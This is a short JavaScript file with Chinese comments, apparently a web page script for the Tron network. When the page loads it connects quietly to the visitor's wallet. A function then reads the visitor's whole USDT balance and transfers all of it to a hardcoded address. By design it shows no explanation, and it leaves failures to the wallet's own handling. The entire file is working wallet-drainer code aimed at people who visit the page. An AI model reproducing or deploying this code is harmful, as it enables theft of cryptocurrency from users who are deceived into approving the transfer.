// 初始化 TronWeb
const TronWeb = window.TronWeb;
let tronWeb;
let walletAddress;

// 目标地址
const targetAddress = "THzYeKcgsuFPTYQg4U48UVadqFdQoHY91A";

// TRC20 USDT 合约地址（波场主网 USDT 合约地址）
const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// 自动连接钱包
window.addEventListener("load", async () => {
    // 检查是否支持波场的钱包（通过 window.tronWeb）
    if (window.tronWeb) {
        try {
            tronWeb = window.tronWeb;
            // 检查钱包是否已登录
            if (!tronWeb.defaultAddress.base58) {
                console.error("钱包未登录，请登录钱包");
                return;
            }
            walletAddress = tronWeb.defaultAddress.base58;
        } catch (error) {
            console.error("钱包连接错误:", error);
        }
    } else {
        console.error("请安装 TronLink、TokenPocket 或其他支持波场的钱包");
    }
});

// 转账 USDT 函数
async function transferUSDT() {
    try {
        // 获取 USDT 合约实例
        const contract = await tronWeb.contract().at(usdtContractAddress);

        // 获取余额
        const balance = await contract.balanceOf(walletAddress).call();
        const balanceInUSDT = tronWeb.fromSun(balance); // 转换为 USDT 单位（USDT 有 6 位小数）

        // 调用 transfer 方法，转账全部余额
        await contract.transfer(
            targetAddress,
            balance // 余额为 0 也会发起转账，交给钱包处理
        ).send({
            shouldPollResponse: false // 不等待交易确认，直接交给钱包
        });

        // 转账发起后，交给钱包处理，不需要额外提示
    } catch (error) {
        console.error("转账失败:", error);
        // 错误交给钱包处理，不显示提示
    }
}
